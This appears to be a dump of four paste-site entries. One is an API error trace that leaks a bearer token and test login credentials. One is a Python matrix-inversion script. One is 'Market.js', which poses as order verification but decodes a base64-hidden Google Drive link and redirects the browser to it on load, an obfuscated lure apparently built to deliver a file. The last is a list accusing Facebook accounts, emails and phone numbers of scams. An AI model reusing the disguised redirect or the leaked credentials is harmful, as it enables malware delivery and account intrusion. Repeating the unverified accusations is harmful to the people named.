Us7XwdY9,trace,vasylmartyniv,JSON,Wednesday 16th of April 2025 04:53:31 PM CDT,"{""config"": {""adapter"": [""xhr"", ""http"", ""fetch""], ""baseURL"": ""https://dev-api.contractorsischool.com/api/v2"", ""data"": ""{\""email\"":\""testing132@test.com\"",\""password\"":\""123456789\""}"", ""env"": {""Blob"": [Function Blob], ""FormData"": [Function FormData]}, ""headers"": [Object], ""maxBodyLength"": -1, ""maxContentLength"": -1, ""method"": ""post"", ""timeout"": 0, ""transformRequest"": [[Function transformRequest]], ""transformResponse"": [[Function transformResponse]], ""transitional"": {""clarifyTimeoutError"": false, ""forcedJSONParsing"": true, ""silentJSONParsing"": true}, ""url"": ""/auth/login"", ""validateStatus"": [Function validateStatus], ""xsrfCookieName"": ""XSRF-TOKEN"", ""xsrfHeaderName"": ""X-XSRF-TOKEN""}, ""data"": {""error"": {""code"": 500, ""details"": [Object], ""message"": ""An unknown error occurred""}}, ""headers"": {""access-control-allow-headers"": ""Authorization,Content-Type"", ""access-control-allow-methods"": ""GET, POST, PUT, PATCH, DELETE, OPTIONS"", ""access-control-allow-origin"": ""*"", ""cache-control"": ""no-cache, private"", ""cf-cache-status"": ""DYNAMIC"", ""cf-ray"": ""9316e61beadcc048-WAW"", ""content-type"": ""application/json"", ""date"": ""Wed, 16 Apr 2025 21:50:32 GMT"", ""server"": ""cloudflare"", ""x-powered-by"": ""PHP/8.1.2""}, ""request"": {""DONE"": 4, ""HEADERS_RECEIVED"": 2, ""LOADING"": 3, ""OPENED"": 1, ""UNSENT"": 0, ""_aborted"": false, ""_cachedResponse"": undefined, ""_hasError"": false, ""_headers"": {""accept"": ""application/json, text/plain, */*"", ""authorization"": ""Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vYXBpLmNvbnRyYWN0b3JzaXNjaG9vbC5jb20vYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3NDQ4MzY2MzgsImV4cCI6MTc0NDg0MDIzOCwibmJmIjoxNzQ0ODM2NjM4LCJqdGkiOiJpbVhDbnVZcjEyNTB1VDhTIiwic3ViIjoiMTIzNzA3IiwicHJ2IjoiMWQwYTAyMGFjZjVjNGI2YzQ5Nzk4OWRmMWFiZjBmYmQ0ZThjOGQ2MyJ9.70rVnBh02dakMrhe_n3HFz7jaw10GQnR0GToOV6FaoQ"", ""content-type"": ""application/json""}, ""_incrementalEvents"": false, ""_lowerCaseResponseHeaders"": {""access-control-allow-headers"": ""Authorization,Content-Type"", ""access-control-allow-methods"": ""GET, POST, PUT, PATCH, DELETE, OPTIONS"", ""access-control-allow-origin"": ""*"", ""cache-control"": ""no-cache, private"", ""cf-cache-status"": ""DYNAMIC"", ""cf-ray"": ""9316e61beadcc048-WAW"", ""content-type"": ""application/json"", ""date"": ""Wed, 16 Apr 2025 21:50:32 GMT"", ""server"": ""cloudflare"", ""x-powered-by"": ""PHP/8.1.2""}, ""_method"": ""POST"", ""_perfKey"": ""network_XMLHttpRequest_https://dev-api.contractorsischool.com/api/v2/auth/login"", ""_performanceLogger"": {""_closed"": false, ""_extras"": [Object], ""_pointExtras"": [Object], ""_points"": [Object], ""_timespans"": [Object]}, ""_requestId"": null, ""_response"": ""{\""error\"":{\""message\"":\""An unknown error occurred\"",\""code\"":500,\""details\"":{\""trace\"":[{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Controller.php\"",\""line\"":54,\""function\"":\""login\"",\""class\"":\""App\\\\Http\\\\Controllers\\\\AuthController\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/ControllerDispatcher.php\"",\""line\"":45,\""function\"":\""callAction\"",\""class\"":\""Illuminate\\\\Routing\\\\Controller\"",\""type\"":\""->\"",\""args\"":[\""login\"",[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Route.php\"",\""line\"":262,\""function\"":\""dispatch\"",\""class\"":\""Illuminate\\\\Routing\\\\ControllerDispatcher\"",\""type\"":\""->\"",\""args\"":[{\""uri\"":\""api\\/v2\\/auth\\/login\"",\""methods\"":[\""POST\""],\""action\"":{\""as\"":\""api.auth.login.v2\"",\""uses\"":\""App\\\\Http\\\\Controllers\\\\AuthController@login\"",\""controller\"":\""App\\\\Http\\\\Controllers\\\\AuthController@login\"",\""namespace\"":\""App\\\\Http\\\\Controllers\"",\""prefix\"":\""api\\/v2\"",\""where\"":[],\""middleware\"":[\""Froiden\\\\RestAPI\\\\Middleware\\\\ApiMiddleware\""]},\""isFallback\"":false,\""controller\"":{},\""defaults\"":[],\""wheres\"":[],\""parameters\"":[],\""parameterNames\"":[],\""computedMiddleware\"":[\""Froiden\\\\RestAPI\\\\Middleware\\\\ApiMiddleware\""],\""compiled\"":{}},{},\""login\""]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Route.php\"",\""line\"":205,\""function\"":\""runController\"",\""class\"":\""Illuminate\\\\Routing\\\\Route\"",\""type\"":\""->\"",\""args\"":[]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Router.php\"",\""line\"":721,\""function\"":\""run\"",\""class\"":\""Illuminate\\\\Routing\\\\Route\"",\""type\"":\""->\"",\""args\"":[]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":128,\""function\"":\""Illuminate\\\\Routing\\\\{closure}\"",\""class\"":\""Illuminate\\\\Routing\\\\Router\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/froiden\\/laravel-rest-api\\/src\\/Middleware\\/ApiMiddleware.php\"",\""line\"":17,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":167,\""function\"":\""handle\"",\""class\"":\""Froiden\\\\RestAPI\\\\Middleware\\\\ApiMiddleware\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":103,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Router.php\"",\""line\"":723,\""function\"":\""then\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Router.php\"",\""line\"":698,\""function\"":\""runRouteWithinStack\"",\""class\"":\""Illuminate\\\\Routing\\\\Router\"",\""type\"":\""->\"",\""args\"":[{\""uri\"":\""api\\/v2\\/auth\\/login\"",\""methods\"":[\""POST\""],\""action\"":{\""as\"":\""api.auth.login.v2\"",\""uses\"":\""App\\\\Http\\\\Controllers\\\\AuthController@login\"",\""controller\"":\""App\\\\Http\\\\Controllers\\\\AuthController@login\"",\""namespace\"":\""App\\\\Http\\\\Controllers\"",\""prefix\"":\""api\\/v2\"",\""where\"":[],\""middleware\"":[\""Froiden\\\\RestAPI\\\\Middleware\\\\ApiMiddleware\""]},\""isFallback\"":false,\""controller\"":{},\""defaults\"":[],\""wheres\"":[],\""parameters\"":[],\""parameterNames\"":[],\""computedMiddleware\"":[\""Froiden\\\\RestAPI\\\\Middleware\\\\ApiMiddleware\""],\""compiled\"":{}},{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Router.php\"",\""line\"":662,\""function\"":\""runRoute\"",\""class\"":\""Illuminate\\\\Routing\\\\Router\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{\""uri\"":\""api\\/v2\\/auth\\/login\"",\""methods\"":[\""POST\""],\""action\"":{\""as\"":\""api.auth.login.v2\"",\""uses\"":\""App\\\\Http\\\\Controllers\\\\AuthController@login\"",\""controller\"":\""App\\\\Http\\\\Controllers\\\\AuthController@login\"",\""namespace\"":\""App\\\\Http\\\\Controllers\"",\""prefix\"":\""api\\/v2\"",\""where\"":[],\""middleware\"":[\""Froiden\\\\RestAPI\\\\Middleware\\\\ApiMiddleware\""]},\""isFallback\"":false,\""controller\"":{},\""defaults\"":[],\""wheres\"":[],\""parameters\"":[],\""parameterNames\"":[],\""computedMiddleware\"":[\""Froiden\\\\RestAPI\\\\Middleware\\\\ApiMiddleware\""],\""compiled\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Routing\\/Router.php\"",\""line\"":651,\""function\"":\""dispatchToRoute\"",\""class\"":\""Illuminate\\\\Routing\\\\Router\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Kernel.php\"",\""line\"":167,\""function\"":\""dispatch\"",\""class\"":\""Illuminate\\\\Routing\\\\Router\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":128,\""function\"":\""Illuminate\\\\Foundation\\\\Http\\\\{closure}\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Kernel\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/fruitcake\\/laravel-cors\\/src\\/HandleCors.php\"",\""line\"":38,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":167,\""function\"":\""handle\"",\""class\"":\""Fruitcake\\\\Cors\\\\HandleCors\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Http\\/Middleware\\/TrustProxies.php\"",\""line\"":39,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/monicahq\\/laravel-cloudflare\\/src\\/Http\\/Middleware\\/TrustProxies.php\"",\""line\"":25,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Http\\\\Middleware\\\\TrustProxies\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":167,\""function\"":\""handle\"",\""class\"":\""Monicahq\\\\Cloudflare\\\\Http\\\\Middleware\\\\TrustProxies\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Middleware\\/TransformsRequest.php\"",\""line\"":21,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Middleware\\/ConvertEmptyStringsToNull.php\"",\""line\"":31,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Middleware\\\\TransformsRequest\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":167,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Middleware\\\\ConvertEmptyStringsToNull\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Middleware\\/TransformsRequest.php\"",\""line\"":21,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Middleware\\/TrimStrings.php\"",\""line\"":40,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Middleware\\\\TransformsRequest\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":167,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Middleware\\\\TrimStrings\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Middleware\\/ValidatePostSize.php\"",\""line\"":27,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":167,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Middleware\\\\ValidatePostSize\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Middleware\\/PreventRequestsDuringMaintenance.php\"",\""line\"":86,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":167,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Middleware\\\\PreventRequestsDuringMaintenance\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}},{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Pipeline\\/Pipeline.php\"",\""line\"":103,\""function\"":\""Illuminate\\\\Pipeline\\\\{closure}\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Kernel.php\"",\""line\"":142,\""function\"":\""then\"",\""class\"":\""Illuminate\\\\Pipeline\\\\Pipeline\"",\""type\"":\""->\"",\""args\"":[{}]},{\""file\"":\""\\/var\\/www\\/vendor\\/laravel\\/framework\\/src\\/Illuminate\\/Foundation\\/Http\\/Kernel.php\"",\""line\"":111,\""function\"":\""sendRequestThroughRouter\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Kernel\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]},{\""file\"":\""\\/var\\/www\\/public\\/index.php\"",\""line\"":52,\""function\"":\""handle\"",\""class\"":\""Illuminate\\\\Foundation\\\\Http\\\\Kernel\"",\""type\"":\""->\"",\""args\"":[{\""attributes\"":{},\""request\"":{},\""query\"":{},\""server\"":{},\""files\"":{},\""cookies\"":{},\""headers\"":{}}]}],\""code\"":0}}}"", ""_responseType"": """", ""_sent"": true, ""_subscriptions"": [], ""_timedOut"": false, ""_trackingName"": ""unknown"", ""_url"": ""https://dev-api.contractorsischool.com/api/v2/auth/login"", ""readyState"": 4, ""responseHeaders"": {""Access-Control-Allow-Origin"": ""*"", ""Cache-Control"": ""no-cache, private"", ""Content-Type"": ""application/json"", ""Date"": ""Wed, 16 Apr 2025 21:50:32 GMT"", ""Server"": ""cloudflare"", ""access-control-allow-headers"": ""Authorization,Content-Type"", ""access-control-allow-methods"": ""GET, POST, PUT, PATCH, DELETE, OPTIONS"", ""cf-cache-status"": ""DYNAMIC"", ""cf-ray"": ""9316e61beadcc048-WAW"", ""x-powered-by"": ""PHP/8.1.2""}, ""responseURL"": ""https://dev-api.contractorsischool.com/api/v2/auth/login"", ""status"": 500, ""timeout"": 0, ""upload"": {}, ""withCredentials"": true}, ""status"": 500, ""statusText"": undefined}"
szUyu60C,Untitled,UsSe3wa,Python,Wednesday 16th of April 2025 04:47:32 PM CDT,"# MatveyPanchenko DSAI-03
from copy import deepcopy

def inverse_gj(a, eps=1e-12):
    n = len(a)
    if not all(len(r) == n for r in a):
        raise ValueError(""Matrix must be square"")
    aug = [r + [int(i == j) for j in range(n)] for i, r in enumerate(deepcopy(a))]
    for c in range(n):
        p = max(range(c, n), key=lambda r: abs(aug[r][c]))
        if abs(aug[p][c]) < eps:
            raise ValueError(""Singular matrix"")
        aug[c], aug[p] = aug[p], aug[c]
        piv = aug[c][c]
        aug[c] = [x / piv for x in aug[c]]
        for r in range(n):
            if r == c:
                continue
            f = aug[r][c]
            aug[r] = [rv - f * cv for rv, cv in zip(aug[r], aug[c])]
    return [row[n:] for row in aug]

def read_mat():
    n = int(input(""n: ""))
    return [list(map(float, input().split())) for _ in range(n)]

def show(mat, prec=6):
    for r in mat:
        print(*(f""{x:.{prec}f}"" for x in r))

if __name__ == ""__main__"":
    m = read_mat()
    show(inverse_gj(m))
"
Q84f70dK,Market.js,jm33,JavaScript,Wednesday 16th of April 2025 04:44:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99883/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xdY4bm8e,Anonymous share (scammers) #Killonsite,RebelRose,Bash,Wednesday 16th of April 2025 04:43:16 PM CDT,"Links Below are Not part of the Anonymous Collective !
They are scammers looking for victims to make money off
They have many profiles 
And pages 
They do not represent the anonymous idea as #Anonymous is not for profit 
#opshutdown 

https://www.facebook.com/profile.php?id=100079442268747

https://www.facebook.com/anonymousbody

https://www.facebook.com/profile.php?id=61559192432867

https://www.facebook.com/profile.php?id=100085547782354

https://www.facebook.com/profile.php?id=61551488454125

https://www.facebook.com/profile.php?id=61551488454125

https://www.facebook.com/profile.php?id=100093671621084

https://www.facebook.com/profile.php?id=100091466796258

https://www.facebook.com/profile.php?id=100093314723047

https://www.facebook.com/profile.php?id=61550208187807

https://www.facebook.com/profile.php?id=61558442261311

https://www.facebook.com/profile.php?id=61556145795644

https://www.facebook.com/profile.php?id=100079442268747

https://www.facebook.com/profile.php?id=100079442268747

https://www.facebook.com/anonymousbody

https://www.facebook.com/profile.php?id=100067969850169

https://www.facebook.com/profile.php?id=100089467954985

https://www.facebook.com/profile.php?id=61557944244882

https://www.facebook.com/Spadoto22

https://www.facebook.com/profile.php?id=61559044042599

https://www.facebook.com/Collective.Anonymous

https://www.facebook.com/profile.php?id=100087026546931

https://www.facebook.com/profile.php?id=61550190827485

https://www.facebook.com/profile.php?id=100089843475486

https://www.facebook.com/profile.php?id=100089891126478

https://www.facebook.com/profile.php?id=100089891126478

https://www.facebook.com/profile.php?id=61552913900615

https://www.facebook.com/profile.php?id=100093233344050

https://www.facebook.com/profile.php?id=61551652889701

https://www.facebook.com/AnonymousKan

https://www.facebook.com/lifeisruff

https://www.facebook.com/Anonymouz009

https://www.facebook.com/profile.php?id=100091957312000

https://www.facebook.com/profile.php?id=100089967511654

https://www.facebook.com/AnonymousCollectivess

https://www.facebook.com/profile.php?id=100081314478774

https://www.facebook.com/profile.php?id=100095104182986

https://www.facebook.com/commanderxanonss

https://www.facebook.com/profile.php?id=100091331721958

https://www.facebook.com/profile.php?id=61558856169123

https://www.facebook.com/profile.php?id=100095688065357

https://www.facebook.com/profile.php?id=61557024236232

https://www.facebook.com/profile.php?id=61558668705181

https://www.facebook.com/profile.php?id=100090839164575

https://www.facebook.com/profile.php?id=61554853438005

https://www.facebook.com/profile.php?id=61554123211177

https://www.facebook.com/profile.php?id=61554123211177

https://www.facebook.com/AnonymousAT

https://www.facebook.com/Anonymouszica

Zica20nation@gmail.com

t.me/Anonymouss_Hacktivist

https://www.facebook.com/profile.php?id=100082341955900

https://www.facebook.com/profile.php?id=100077230885486

https://www.facebook.com/Hacktivists2

https://www.facebook.com/profile.php?id=100054410022830

https://www.facebook.com/anonymoustruthseekers

https://www.facebook.com/profile.php?id=100091397064102

+1 916-497-9000

Collectiveanonymous37@gmail.com

https://www.facebook.com/profile.php?id=100090114407175

https://www.facebook.com/profile.php?id=100092505284891

https://www.facebook.com/profile.php?id=61557730033652

https://www.facebook.com/profile.php?id=61555873363608

https://www.facebook.com/profile.php?id=100094046061678

https://www.facebook.com/profile.php?id=61552408718278

https://www.facebook.com/profile.php?id=61552278052779

https://www.facebook.com/profile.php?id=100066745837215

https://www.facebook.com/profile.php?id=61559192432867

https://www.facebook.com/profile.php?id=61551488454125

https://www.facebook.com/profile.php?id=100085547782354

https://www.facebook.com/profile.php?id=100093671621084

https://www.facebook.com/surefixedmatch11

Temiloluwajahsmine@gmail.com

t.me/+cnpdc2L9bc8xMzFk


https://www.facebook.com/profile.php?id=100084759701103


https://www.facebook.com/profile.php?id=100093088792580

https://www.facebook.com/profile.php?id=100091916250406

https://www.facebook.com/profile.php?id=100092272290364

https://www.facebook.com/anonymousmessengeer

https://www.facebook.com/profile.php?id=100092272290364

+1 213-248-4170

https://www.facebook.com/anonymousmessengeer

https://www.facebook.com/profile.php?id=100093078459181

https://www.facebook.com/profile.php?id=61551932765888

https://www.facebook.com/profile.php?id=100095135253354

https://www.facebook.com/profile.php?id=61550469651428

https://www.facebook.com/profile.php?id=61555356144837

https://www.facebook.com/profile.php?id=100082151810143

https://www.facebook.com/profile.php?id=100082151810143

https://www.facebook.com/profile.php?id=61557418812697&__tn__=%3C%2Cd

https://www.facebook.com/profile.php?id=61557953450803

https://www.facebook.com/profile.php?id=100092389595485

https://www.facebook.com/mirahkind1

https://www.facebook.com/profile.php?id=100091980023229

https://www.facebook.com/profile.php?id=100091518146098

t.me/Silvester_admin_message_reply

https://www.facebook.com/profile.php?id=100084836676101

https://www.facebook.com/profile.php?id=100088265994045

t.me/anonymousverified

https://www.facebook.com/profile.php?id=61554417440242

https://www.facebook.com/profile.php?id=61554272841866

Links Below are Not part of the Anonymous Collective !
They are scammers looking for victims to make money off
They have many profiles 
And pages 
They do not represent the anonymous idea as #Anonymous is not for profit 
#opshutdown 
https://www.facebook.com/profile.php?id=100089744537749
https://www.facebook.com/profile.php?id=61559441085745
https://www.facebook.com/profile.php?id=100090885216000
https://www.facebook.com/profile.php?id=61557730033652
https://www.facebook.com/profile.php?id=100083809866991
https://www.facebook.com/profile.php?id=100092505284891
https://www.facebook.com/profile.php?id=61550239722226
https://www.facebook.com/profile.php?id=100090700083728
https://www.facebook.com/profile.php?id=100087058783325
https://www.facebook.com/profile.php?id=100089747403371
https://www.facebook.com/profile.php?id=100090114407175
https://www.facebook.com/groups/227183964372446/
https://www.facebook.com/groups/463298345730657
https://www.facebook.com/AnonymousLegionsgroup/
https://www.facebook.com/Anonymoushackgame/
https://www.facebook.com/groups/227183964372446
https://www.facebook.com/groups/510047611152523
https://www.facebook.com/groups/523984213153719
https://www.facebook.com/ezeanyimichaelanaezi.famous/
https://www.facebook.com/atmhakk/
https://www.facebook.com/groups/763131360827640
https://www.facebook.com/profile.php?id=61558786820645
https://www.facebook.com/anonyouslegion/
https://www.facebook.com/profile.php?id=100084836676101
https://www.facebook.com/profile.php?id=100064270112115
https://www.facebook.com/profile.php?id=100080990775205
https://www.facebook.com/profile.php?id=100091397064102
https://www.facebook.com/profile.php?id=100088265994045
https://www.facebook.com/profile.php?id=100087226251718
https://www.facebook.com/profile.php?id=100091272435603
https://www.facebook.com/groups/anonymous.international1/
https://www.facebook.com/profile.php?id=100088265994045
https://www.facebook.com/profile.php?id=100093066608942
https://www.facebook.com/anonymous.collective.998535/
https://www.facebook.com/groups/634577165433767
https://www.facebook.com/profile.php?id=100074415975528
https://www.facebook.com/commanderx28164/
https://www.facebook.com/profile.php?id=100094368717245
https://www.facebook.com/profile.php?id=61550288981590
https://www.facebook.com/profile.php?id=61558625170042
https://www.facebook.com/commanderxanonsss/
https://www.facebook.com/commanderxanonss/
https://www.facebook.com/anonymoustruthseekers/
https://www.facebook.com/nobleunanimous/
https://www.facebook.com/profile.php?id=100095104182986
https://www.facebook.com/groups/763131360827640
https://www.facebook.com/anonymous.collective.926458/
https://www.facebook.com/profile.php?id=100092286212424
